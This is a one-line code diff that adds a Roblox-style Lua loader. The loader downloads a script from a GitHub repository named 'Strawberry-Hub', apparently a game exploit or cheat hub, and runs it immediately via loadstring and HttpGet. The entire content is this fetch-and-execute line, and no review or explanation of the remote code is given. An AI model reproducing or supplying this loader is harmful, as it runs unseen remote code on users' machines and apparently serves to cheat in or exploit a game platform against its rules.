@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/grizzyzev/Strawberry-Hub/refs/heads/main/Script"))()
